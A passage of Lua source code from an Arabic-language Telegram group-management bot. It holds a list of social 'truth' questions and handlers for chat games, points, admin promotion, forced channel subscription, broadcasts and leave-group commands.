المُقرب؟.','تحب العلاقات العاطفيه ولا الصداقه؟.','العين الي تستصغرك........؟','تجامل الناس ولا اللي بقلبك على لسانك؟','وقت حزنك تلجأ لمن يخفف عنك.؟','اكثر المتابعين عندك باي برنامج؟','صفه تتمناها بشريك حياتك؟.','من اصدق في الحب الولد ولا البنت؟.','يرد عليك متأخر على رسالة مهمة وبكل برود، موقفك؟','كلمة لشخص بعيد؟','رحتي لعرس وأكتشفتي العريس حبيبك شنو ردة فعلك.؟','تسامح شخص وجع قلبك ؟.','احقر موقف صار لك؟.','ماذا لو كانت مشاعر البشر مرئية ؟','وين نلقى السعاده برايك؟','قد تخيلت شي في بالك وصار ؟','صفة يطلقها عليك الشخص المفضّل؟','اخر خيانه؟.','تحب تحتفظ بالذكريات ؟','لو بتغير اسمك ايش بيكون الجديد ؟','الاعتذار أخلاق ولا ضعف.؟','هل أنت من النوع الذي يواجه المشاكل أو من النوع الذي يهرب ؟','‏ تكره أحد من قلبك ؟','تاك لشخص وكوله اعترف لك؟','مع أو ضد لو كان خيراً لبقئ.؟','‏هل لديك شخص لا تخفي عنه شيئًا؟','اغنيه تأثر بيك؟','المطوعة والعاقلة من شلتك.؟','مواصفات امير/ة احلامك؟.','‏كلمة لصديقك البعيد؟','تتابع انمي؟ إذا نعم ما أفضل انمي شاهدته؟','قرارتك راضي عنها ام لا ؟','تسامح شخص سبب في بكائك.؟','لو حصل واشتريت جزيرة، ماذا ستختار اسمًا لها.؟','اغنيتك المفضلة؟.','شاركنا اقوئ نكتة عندك.؟','ماذا لو عاد مُشتاقاً.؟','مسلسل كرتوني له ذكريات جميلة عندك؟','أخر اتصال جاك من مين ؟','حيوانك المفضل؟','اول ولد لك شنو رح تسميه ؟','سبب الرحيل.؟','قولها بلهجتك « لا أملك المال ».؟','نهارك يصير أجمل بوجود ..؟','‏لو خيروك، الزواج بمن تُحب او تاخذ مليون دولار؟','تاك لشخص سوالفه حلوه ؟','تصرف لا يُمكن أن تتحمله.؟','ماهي الاطباع فيك التي تحاول اخفائها عن الناس؟.','شيء عندك اهم من الناس؟','قد تخيلت شي في بالك وصار ؟','تمحي العشرة الطيبة عشان موقف ماعجبك أو سوء فهم.؟','جربت شعور احد يحبك بس انت متكدر تحبه؟','بنفسك تبوس شخص بهاي الحظه؟','إذا كانت الصراحة ستبعد عنك من تحب هل تمتلك الشجاعة للمصارحة ام لا .؟','أكمل الدعاء بما شئت ‏اللهم أرزقني ..؟','الصق اخر شيء نسخته .؟','‏تفضل جولة في الغابة أم جولة بحرية؟','‏تاك لشخص لديك لا تخفي عنه شي؟','كلمة غريبة ومعناها؟','‏اوقات لا تحب ان يكلمك فيها احد؟','تملك وسواس من شيء معين ؟','اشمر مقطع من اغنيه متطلع منراسك؟','هل تتأثرين بالكلام الرومانسي من الشباب؟','ما اول شيء يلفت انتباهك في الرجل؟','ماذا تفعلين اذا تعرضتِ للتحرش من قبل شخص ما..؟','اذا كنت شخصاً غني هل توافق على الزواج من فتاة فقيرة..؟','ما هو أكثر شئ لا تستطيع تحمله..؟','ما هي نقاط الضعف في شخصيتك..؟','هل توافق أن زوجتك تدفع الحساب في إحدي المطاعم وأنت موجود؟','ماذا تفعل لو أكتشفت ان زوجتك على علاقة بصديقك؟','ما هي أكثر صفة تكرهها في زوجتك..؟','اذا كان لديك فرصة للخروج مع من سوف تخرج ربعك او زوجتك..؟','ماذا تفعل عندما تري دموع زوجتك..؟','إلى أي الرجال تُريدين أن يكون انتماؤك؟','كم مرة خُدعت في أشخاصٍ، وثقتِ فيهم ثقةً عمياء؟','هل ما زال أصدقاء الطفولة أصدقاءً لك حتى الآن؟','هل ترغبين في أن يكون خطيبك وسيمًا؟','كم مرةٍ فعلت شيئًا لا ترغبين في الإفصاح عنه؟','هل استطعت أن تُحققي آمالك العلمية والعاطفية؟','أكثر شئ ندمت على فعله..؟','هل تشعرين أنك فتاة محظوظة..؟','هل علاقة الحب التي كانت في صغرك، مازالت مستمرة؟','ما هو أكثر شئ يفرحك في هذه الحياة..؟','كم مرة أردت شراء ملابس لأنها جميلة ولكنها لا تناسبك..؟','كم عدد المرات التي قمت فيها بإستبدال شئ اشتريته ولم يعجبك بعد ذلك.؟','كم مرة قمت بكسر الرجيم من أجل تناول طعامك المفضل..؟','هل تعرضت للظلم يوماً ما وعلى يد من..؟','هل كذبت على والديك من قبل..؟','هل خرجتي مع شخص تعرفتي عليه من خلال التليكرام من قبل..؟','هل لو تقدم شخص لاختك من أجل خطبتها وقامت برفضه تقبلين به..؟','لمن تقولين لا أستطيع العيش بدونك..؟','كم عدد المرات التي تعرضتِ فيها إلى أزمة نفسية وأردتِ الصراخ بأعلى صوتك..؟','ماذا تقول للبحر؟','أصعب صفة قد تتواجد في رجل؟','ما أجمل الحياة بدون ...؟','لماذا لم تتم خطبتك حتى الآن..؟','نسبة رضاك عن الأشخاص من حولك هالفترة ؟','ما السيء في هذه الحياة ؟','الفلوس او الحب ؟','أجمل شيء حصل معك خلال هذا الاسبوع ؟','سؤال ينرفزك ؟','كم في حسابك البنكي ؟','شي عندك اهم من الناس ؟','اول ولد او بنت الك شنو تسمي ؟','تفضّل النقاش الطويل او تحب الاختصار ؟','عادي تتزوج او تتزوجين من خارج العشيره ؟','كم مره حبيت ؟','تبادل الكراهية بالكراهية؟ ولا تحرجه بالطيب ؟','قلبي على قلبك مهما صار لمنو تكولها ؟','اكثر المتابعين عندك باي برنامج ؟','نسبة النعاس عندك حاليًا ؟','نسبه الندم عندك للي وثقت بيهم ؟','اول شخص تعرفت عليه بالتليكرام بعده موجود ؟','اذا فديوم شخص ضلمك شنو موقفك ؟','افضل عمر للزواج برئيك ؟','انت من النوع الي دائما ينغدر من اقرب الناس اله ؟','ماهو حيوانك المفضل ؟','تاريخ ميلادك ؟','لونك المفضل ؟','انت من النوع العاطفي والي ميكدر يكتم البداخله ؟','اذا فديوم شخص خانك ويريد يرجعلك تقبل ؟','شي بالحياه مخليك عايش لحد الان ؟','تحب النوم لو الشغل ؟','افضل مكان رحت عليه ؟','اختصر الماضي بكلمه وحده ؟','هل سبق وكنت مصر على أمر ما ومن ثم اكتشفت أنك كنت على خطأ ؟','اكثر كلمة ترفع ضغطك ؟','مع او ضد سب البنت للدفاع عن نفسها ؟','يهمك ظن الناس بيك لو لا؟','عبّر عن مودك بصوره ؟','اغلب وقتك ضايع في ؟','يوم متكدر تنساه ؟','تحس انك محظوظ بالاشخاص الي حولك ؟','تستغل وقت فراغك بشنو ؟','مع او ضد مقولة محد يدوم ل احد ؟','لو اخذوك مستشفى المجانين كيف تثبت لهم انك صاحي ؟','مغني تلاحظ أن صوته يعجب الجميع إلا أنت ؟','اخر خيانه ؟','تصرف ماتتحمله ؟','هل يمكنك الكذب والاستمرار بارتكاب الأخطاء كمحاولة منك لعدم الكشف أنك مخطئ ؟','الصق اخر شي نسخته ؟','عمرك انتقمت من أحد ؟','هل وصلك رسالة غير متوقعة من شخص وأثرت فيك ؟','‏-لو امتلكت العصا السحرية ليوم واحد ماذا ستفعل ؟','جابو طاري شخص تكره عندك تشاركهم ولا تمنعهم ؟','أمنية كنت تتمناها وحققتها ؟','هل التعود على شخص والتحدث معه بشكل يومي يعتبر نوع من أنواع الحب ؟','نسبة جمال صوتك ؟','صفة يطلقها عليك الشخص المفضل ؟','شنو هدفك بالمستقبل القريب ؟','تحب القرائه ؟','كليه تتمنى تنقبل بيها ؟',
'أطول مدة قضيتها بعيد عن أهلك ؟','لو يجي عيد ميلادك تتوقع يجيك هدية؟','يبان عليك الحزن من " صوتك - ملامحك','وين تشوف نفسك بعد سنتين؟','وش يقولون لك لما تغني ؟','عندك حس فكاهي ولا نفسية؟','كيف تتصرف مع الشخص الفضولي ؟','كيف هي أحوال قلبك؟','حاجة تشوف نفسك مبدع فيها ؟','متى حبيت؟','شيء كل م تذكرته تبتسم ...','العلاقه السريه دايماً تكون حلوه؟','صوت مغني م تحبه','لو يجي عيد ميلادك تتوقع يجيك هدية؟','اذا احد سألك عن شيء م تعرفه تقول م اعرف ولا تتفلسف ؟','مع او ضد : النوم افضل حل لـ مشاكل الحياة؟','مساحة فارغة (..............) اكتب اي شيء تبين','اغرب اسم مر عليك ؟','عمرك كلمت فويس احد غير جنسك؟','اذا غلطت وعرفت انك غلطان تحب تعترف ولا تجحد؟','لو عندك فلوس وش السيارة اللي بتشتريها؟','وش اغبى شيء سويته ؟','شيء من صغرك ماتغير فيك؟','وش نوع الأفلام اللي تحب تتابعه؟','وش نوع الأفلام اللي تحب تتابعه؟','تجامل احد على حساب مصلحتك ؟','تتقبل النصيحة من اي شخص؟','كلمه ماسكه معك الفترة هذي ؟','متى لازم تقول لا ؟','اكثر شيء تحس انه مات ف مجتمعنا؟','تؤمن ان في "حُب من أول نظرة" ولا لا ؟.','تؤمن ان في "حُب من أول نظرة" ولا لا ؟.','هل تعتقد أن هنالك من يراقبك بشغف؟','اشياء اذا سويتها لشخص تدل على انك تحبه كثير ؟','اشياء صعب تتقبلها بسرعه ؟','اقتباس لطيف؟','أكثر جملة أثرت بك في حياتك؟','عندك فوبيا من شيء ؟.',
'اكثر لونين تحبهم مع بعض؟','أجمل بيت شعر سمعته ...','سبق وراودك شعور أنك لم تعد تعرف نفسك؟','تتوقع فيه احد حاقد عليك ويكرهك ؟','أجمل سنة ميلادية مرت عليك ؟','لو فزعت/ي لصديق/ه وقالك مالك دخل وش بتسوي/ين؟','وش تحس انك تحتاج الفترة هاذي ؟','يومك ضاع على؟','@منشن .. شخص تخاف منه اذا عصب ...','فيلم عالق في ذهنك لا تنساه مِن روعته؟','تختار أن تكون غبي أو قبيح؟','الفلوس او الحب ؟','أجمل بلد في قارة آسيا بنظرك؟','ما الذي يشغل بالك في الفترة الحالية؟','احقر الناس هو من ...','وين نلقى السعاده برايك؟','اشياء تفتخر انك م سويتها ؟','تزعلك الدنيا ويرضيك ؟','وش الحب بنظرك؟','افضل هديه ممكن تناسبك؟','كم في حسابك البنكي ؟','كلمة لشخص أسعدك رغم حزنك في يومٍ من الأيام ؟','عمرك انتقمت من أحد ؟!','ما السيء في هذه الحياة ؟','غنية عندك معاها ذكريات🎵🎻','/','أفضل صفة تحبه بنفسك؟','اكثر وقت تحب تنام فيه ...','أطول مدة نمت فيها كم ساعة؟','أصعب قرار ممكن تتخذه ؟','أفضل صفة تحبه بنفسك؟','اكثر وقت تحب تنام فيه ...','أنت محبوب بين الناس؟ ولاكريه؟','إحساسك في هاللحظة؟','اخر شيء اكلته ؟','تشوف الغيره انانيه او حب؟','اذكر موقف ماتنساه بعمرك؟','اكثر مشاكلك بسبب ؟','اول ماتصحى من النوم مين تكلمه؟','آخر مرة ضحكت من كل قلبك؟','لو الجنسية حسب ملامحك وش بتكون جنسيتك؟','اكثر شيء يرفع ضغطك','اذكر موقف ماتنساه بعمرك؟','لو قالوا لك  تناول صنف واحد فقط من الطعام لمدة شهر .',
'كيف تشوف الجيل ذا؟','ردة فعلك لو مزح معك شخص م تعرفه ؟','احقر الناس هو من ...','تحب ابوك ولا امك','آخر فيلم مسلسل والتقييم🎥؟','أقبح القبحين في العلاقة: الغدر أو الإهمال🤷🏼؟','كلمة لأقرب شخص لقلبك🤍؟','حط@منشن لشخص وقوله "حركتك مالها داعي"😼!','اذا جاك خبر مفرح اول واحد تعلمه فيه مين💃🏽؟','طبع يمكن يخليك تكره شخص حتى لو كنت تُحبه🙅🏻‍♀️؟','افضل ايام الاسبوع عندك🔖؟','يقولون ان الحياة دروس ، ماهو أقوى درس تعلمته من الحياة🏙؟','تاريخ لن تنساه📅؟','تحب الصيف والا الشتاء❄️☀️؟','شخص تحب تستفزه😈؟','شنو ينادونك وانت صغير (عيارتك)👼🏻؟','عقل يفهمك/ج ولا قلب يحبك/ج❤️؟','اول سفره لك وين رح تكون✈️؟','كم عدد اللي معطيهم بلوك👹؟','نوعية من الأشخاص تتجنبهم في حياتك❌؟','شاركنا صورة او فيديو من تصويرك؟📸','كم من عشره تعطي حظك📩؟','اكثر برنامج تواصل اجتماعي تحبه😎؟','من اي دوله انت🌍؟','اكثر دوله ودك تسافر لها🏞؟','مقولة "نكبر وننسى" هل تؤمن بصحتها🧓🏼؟','تعتقد فيه أحد يراقبك👩🏼‍💻؟','لو بيدك تغير الزمن ، تقدمه ولا ترجعه🕰؟','مشروبك المفضل🍹؟','‏قم بلصق آخر اقتباس نسخته؟💭','كم وزنك/ج طولك/ج؟🌚','كم كان عمرك/ج قبل ٨ سنين😈؟','دوله ندمت انك سافرت لها😁؟','لو قالو لك ٣ أمنيات راح تتحقق عالسريع شنو تكون🧞‍♀️؟','‏- نسبة احتياجك للعزلة من 10📊؟','شخص تحبه حظرك بدون سبب واضح، ردة فعلك🧐؟','مبدأ في الحياة تعتمد عليه دائما🕯؟',
}  
Dev_Joker(msg.chat_id_, msg.id_, 1, ''..BlAcKTeam[math.random(#BlAcKTeam)]..'' , 1, 'md')  
return false
end
end
--     Source BlAcK     --
if text == 'الالعاب' and ChCheck(msg) or text == 'العاب' and ChCheck(msg) or text == 'اللعبه' and ChCheck(msg) or text == '↫ الالعاب ᥀' and ChCheck(msg) then
if not DevJoker:get(BlAcK..'Joker:Lock:Games'..msg.chat_id_) then
Dev_Joker(msg.chat_id_, msg.id_, 1,[[
᥀︙قائمة العاب المجموعه ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙لعبة التخمين ↫ خمن
᥀︙لعبة الامثله ↫ امثله
᥀︙لعبة العكس ↫ العكس
᥀︙لعبة الاسئله ↫ اسئله
᥀︙لعبة الروليت ↫ روليت
᥀︙لعبة الحزوره ↫ حزوره
᥀︙لعبة الترتيب ↫ ترتيب
᥀︙لعبة المعاني ↫ معاني
᥀︙لعبة التويت ↫ كت تويت
᥀︙لعبة المختلف ↫ المختلف
᥀︙لعبة السمايلات ↫ سمايلات
᥀︙لعبة المحيبس ↫ المحيبس
᥀︙لعبة الرياضيات ↫ رياضيات
᥀︙لعبة الانكليزيه ↫ انكليزيه
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙نقاطي • بيع نقاطي
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙[Source Channel](https://t.me/BLACK_TEAM_4)
]], 1, 'md')
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙عذرا الالعاب معطله في المجموعه', 1, 'md')
end
end
--     Source BlAcK     --
if text == 'بيع نقاطي' and ChCheck(msg) then
if tonumber((DevJoker:get(BlAcK..'Joker:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙لم تربح اي نقطه\n᥀︙ارسل ↫ الالعاب للعب', 1, 'md')
else
DevJoker0 = (DevJoker:get(BlAcK..'Joker:GamesNumber'..msg.chat_id_..msg.sender_user_id_) * 50)
DevJoker:incrby(BlAcK..'Joker:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_,DevJoker0)
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙تم بيع '..(DevJoker:get(BlAcK..'Joker:GamesNumber'..msg.chat_id_..msg.sender_user_id_))..' من نقاطك\n᥀︙كل نقطه تساوي 50 رساله', 'md')
DevJoker:del(BlAcK..'Joker:GamesNumber'..msg.chat_id_..msg.sender_user_id_)
end
end
--     Source BlAcK     --
if text == 'رفع المشرفين' and ChCheck(msg) or text == 'رفع الادمنيه' and ChCheck(msg) then  
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 200},function(arg,Joker) 
local num = 0
local admins = Joker.members_  
for i=0 , #admins do   
if Joker.members_[i].bot_info_ == false and Joker.members_[i].status_.ID == "ChatMemberStatusEditor" then
DevJoker:sadd(BlAcK..'Joker:Admins:'..msg.chat_id_, admins[i].user_id_)   
num = num + 1
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,dp) 
if dp.first_name_ == false then
DevJoker:srem(BlAcK..'Joker:Admins:'..msg.chat_id_, admins[i].user_id_)   
end
end,nil)   
else
DevJoker:srem(BlAcK..'Joker:Admins:'..msg.chat_id_, admins[i].user_id_)   
end 
if Joker.members_[i].status_.ID == "ChatMemberStatusCreator" then  
Manager_id = admins[i].user_id_  
DevJoker:sadd(BlAcK..'Joker:BasicConstructor:'..msg.chat_id_,Manager_id)  
DevJoker:sadd(BlAcK..'Joker:JokerConstructor:'..msg.chat_id_,Manager_id)   
end  
end  
if num == 0 then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙لا يوجد ادمنيه ليتم رفعهم\n᥀︙تم رفع مالك المجموعه", 1, 'md')
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم رفع '..num..' من الادمنيه \n᥀︙تم رفع مالك المجموعه', 1, 'md')
end
end,nil) 
end
--     Source BlAcK     --
if text == 'غادر' and SudoBot(msg) and ChCheck(msg) then
if DevJoker:get(BlAcK.."Joker:Left:Bot"..BlAcK) then
Dev_Joker(msg.chat_id_,msg.id_, 1, "᥀︙المغادره معطله من قبل المطور الاساسي", 1, 'md')
return false  
end
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم مغادرة المجموعه \n᥀︙تم حذف جميع بياناتها ', 1, 'md')
ChatLeave(msg.chat_id_, BlAcK)
DevJoker:srem(BlAcK.."Joker:Groups",msg.chat_id_)
end
--     Source BlAcK     --
if text ==('موقعي') and ChCheck(msg) then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
rtpa = 'المنشئ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
rtpa = 'الادمن'
elseif da.status_.ID == "ChatMemberStatusMember" then
rtpa = 'عضو'
end
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙موقعك ↫ '..rtpa, 1, 'md')
end,nil)
end
--     Source BlAcK     --
if text == "معلوماتي" and ChCheck(msg) then
function get_me(extra,result,success)
local msguser = tonumber(DevJoker:get(BlAcK..'Joker:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
local user_msgs = DevJoker:get(BlAcK..'Joker:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local cont = (tonumber(DevJoker:get(BlAcK..'Joker:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local user_nkt = tonumber(DevJoker:get(BlAcK..'Joker:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
if result.username_ then username = '@'..result.username_ else username = 'لا يوجد' end
if result.last_name_ then lastname = result.last_name_ else lastname = '' end
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙اسمك ↫ ❨ ['..result.first_name_..'] ❩\n᥀︙معرفك ↫ ❨ ['..username..'] ❩\n᥀︙ايديك ↫ ❨ `'..result.id_..'` ❩\n᥀︙نقاطك ↫ ❨ '..user_nkt..' ❩\n᥀︙رسائلك ↫ ❨ '..user_msgs..' ❩\n᥀︙جهاتك ↫ ❨ '..cont..' ❩\n᥀︙تفاعلك ↫ '..formsgs(msguser)..'\n᥀︙رتبتك ↫ '..IdRank(msg.sender_user_id_, msg.chat_id_), 1, 'md')
end
getUser(msg.sender_user_id_,get_me)
end
end
--     Source BlAcK     --
if text == "تعيين قناة الاشتراك" or text == "تغيير قناة الاشتراك" or text == "تعيين الاشتراك الاجباري" or text == "وضع قناة الاشتراك" or text == "↫ تعيين قناة الاشتراك ᥀" then
if not Sudo(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الاساسي فقط ', 1, 'md')
else
DevJoker:setex(BlAcK..'DevJoker4'..msg.sender_user_id_,360,true)
send(msg.chat_id_, msg.id_, '᥀︙ارسل لي معرف قناة الاشتراك الان')
end
return false  
end
if text == "تفعيل الاشتراك الاجباري" or text == "↫  تفعيل الاشتراك الاجباري ᥀" then  
if not Sudo(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الاساسي فقط ', 1, 'md')
else
if DevJoker:get(BlAcK..'Joker:ChId') then
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevJoker:get(BlAcK.."Joker:ChId"))
local GetInfo = JSON.decode(Check)
send(msg.chat_id_, msg.id_,"᥀︙الاشتراك الاجباري مفعل \n᥀︙على القناة ↫ [@"..GetInfo.result.username.."]")
else
DevJoker:setex(BlAcK..'DevJoker4'..msg.sender_user_id_,360,true)
send(msg.chat_id_, msg.id_,"᥀︙لاتوجد قناة لتفعيل الاشتراك\n᥀︙ارسل لي معرف قناة الاشتراك الان")
end
end
return false  
end
if text == "تعطيل الاشتراك الاجباري" or text == "↫  تعطيل الاشتراك الاجباري ᥀" then  
if not Sudo(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الاساسي فقط ', 1, 'md')
else
DevJoker:del(BlAcK..'Joker:ChId')
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل الاشتراك الاجباري'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
end
return false  
end
if text == "حذف قناة الاشتراك" or text == "حذف قناه الاشتراك" or text == "↫ حذف قناة الاشتراك ᥀" then
if not SecondSudo(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الاساسي فقط ', 1, 'md')
else
DevJoker:del(BlAcK..'Joker:ChId')
Dev_Joker(msg.chat_id_, msg.id_, 1,"᥀︙تم حذف قناة الاشتراك الاجباري", 1, 'md') 
end
end
if SecondSudo(msg) then
if text == 'جلب قناة الاشتراك' or text == 'قناة الاشتراك' or text == 'الاشتراك الاجباري' or text == 'قناة الاشتراك الاجباري' or text == '↫ قناة الاشتراك ᥀' then
if DevJoker:get(BlAcK..'Joker:ChId') then
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevJoker:get(BlAcK.."Joker:ChId"))
local GetInfo = JSON.decode(Check)
send(msg.chat_id_, msg.id_, "᥀︙قناة الاشتراك ↫ [@"..GetInfo.result.username.."]")
else
send(msg.chat_id_, msg.id_, "᥀︙لاتوجد قناة في الاشتراك الاجباري")
end
return false  
end end
--     Source BlAcK     --
if SudoBot(msg) then
if text == 'اذاعه للكل بالتوجيه' and tonumber(msg.reply_to_message_id_) > 0 then
function BlAcKTeam(extra,result,success)
if DevJoker:get(BlAcK.."Joker:Send:Bot"..BlAcK) and not JokerSudo(msg) then 
send(msg.chat_id_, msg.id_,"᥀︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
local GpList = DevJoker:smembers(BlAcK.."Joker:Groups")
for k,v in pairs(GpList) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
local PvList = DevJoker:smembers(BlAcK.."Joker:Users")
for k,v in pairs(PvList) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم اذاعة رسالتك بالتوجيه \n᥀︙‏في ↫ ❨ '..#GpList..' ❩ مجموعه \n᥀︙والى ↫ ❨ '..#PvList..' ❩ مشترك \n ✓', 1, 'md')
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),BlAcKTeam)
end
end
--     Source BlAcK     --
if text == "مشاهده المنشور" and ChCheck(msg) or text == "مشاهدات المنشور" and ChCheck(msg) or text == "عدد المشاهدات" and ChCheck(msg) then
DevJoker:set(BlAcK..'Joker:viewget'..msg.sender_user_id_,true)
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙حسنا قم باعادة توجيه للمنشور الذي تريدني حساب مشاهداته', 1, 'md')
end
--     Source BlAcK     --
if text == "سورس" and SourceCh(msg) or text == "السورس" and SourceCh(msg) or text == "يا سورس" and SourceCh(msg) or text == "↫  السورس ᥀" and SourceCh(msg) then
Text = [[
Welcome To Source
᥀︙[BlAcK Team](https://t.me/BLACK_TEAM_4)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text = '᥀ Source Channel',url="https://t.me/BLACK_TEAM_4"}},{{text = '᥀ Developer',url="t.me/UUOUOU_7"},{text = '᥀ Tws BlAcK',url="https://t.me/JOK_ER_7bot"}},{{text= '᥀ Support Source .',url="https://t.me/joinchat/wHu9j9Z41XVmMTlk"}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/BLACK_TEAM_4&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
--     Source BlAcK     --
if ChatType == 'sp' or ChatType == 'gp'  then
if text == "اطردني" and ChCheck(msg) or text == "اطردنيي" and ChCheck(msg) then
if DevJoker:get(BlAcK.."Joker:Kick:Me"..msg.chat_id_) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
DevJoker:set(BlAcK..'yes'..msg.sender_user_id_, 'delyes')
DevJoker:set(BlAcK..'no'..msg.sender_user_id_, 'delno')
local Text = '᥀︙هل انت متأكد من المغادره'
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/delyes"},{text="لا",callback_data="/delno"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     Source BlAcK     --
if text == 'تعطيل اطردني' and Manager(msg) and ChCheck(msg) then
DevJoker:set(BlAcK.."Joker:Kick:Me"..msg.chat_id_, true)
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل امر اطردني'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
end
if text == 'تفعيل اطردني' and Manager(msg) and ChCheck(msg) then
DevJoker:del(BlAcK.."Joker:Kick:Me"..msg.chat_id_)
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل امر اطردني'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
end
--     Source BlAcK     --
if text == "نزلني" and ChCheck(msg) then
if DevJoker:get(BlAcK.."Joker:Del:Me"..msg.chat_id_) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
DevJoker:set(BlAcK..'yesdel'..msg.sender_user_id_, 'delyes')
DevJoker:set(BlAcK..'nodel'..msg.sender_user_id_, 'delno')
local Text = '᥀︙هل انت متأكد من تنزيلك'
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/yesdel"},{text="لا",callback_data="/nodel"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     Source BlAcK     --
if text == 'تعطيل نزلني' and BasicConstructor(msg) and ChCheck(msg) then
DevJoker:set(BlAcK.."Joker:Del:Me"..msg.chat_id_, true)
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل امر نزلني'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
end
if text == 'تفعيل نزلني' and BasicConstructor(msg) and ChCheck(msg) then
DevJoker:del(BlAcK.."Joker:Del:Me"..msg.chat_id_)
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل امر نزلني'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
end
--     Source BlAcK     --
if text and (text == 'تفعيل التاك' or text == 'تفعيل التاك للكل' or text == 'تفعيل تاك للكل') and Admin(msg) and ChCheck(msg) then 
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل امر تاك للكل'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK..'Joker:Lock:TagAll'..msg.chat_id_)
end
if text and (text == 'تعطيل التاك' or text == 'تعطيل التاك للكل' or text == 'تعطيل تاك للكل') and Admin(msg) and ChCheck(msg) then 
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل امر تاك للكل'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK..'Joker:Lock:TagAll'..msg.chat_id_,true)
end
if Admin(msg) then
if text == "تاك للكل" and ChCheck(msg) then
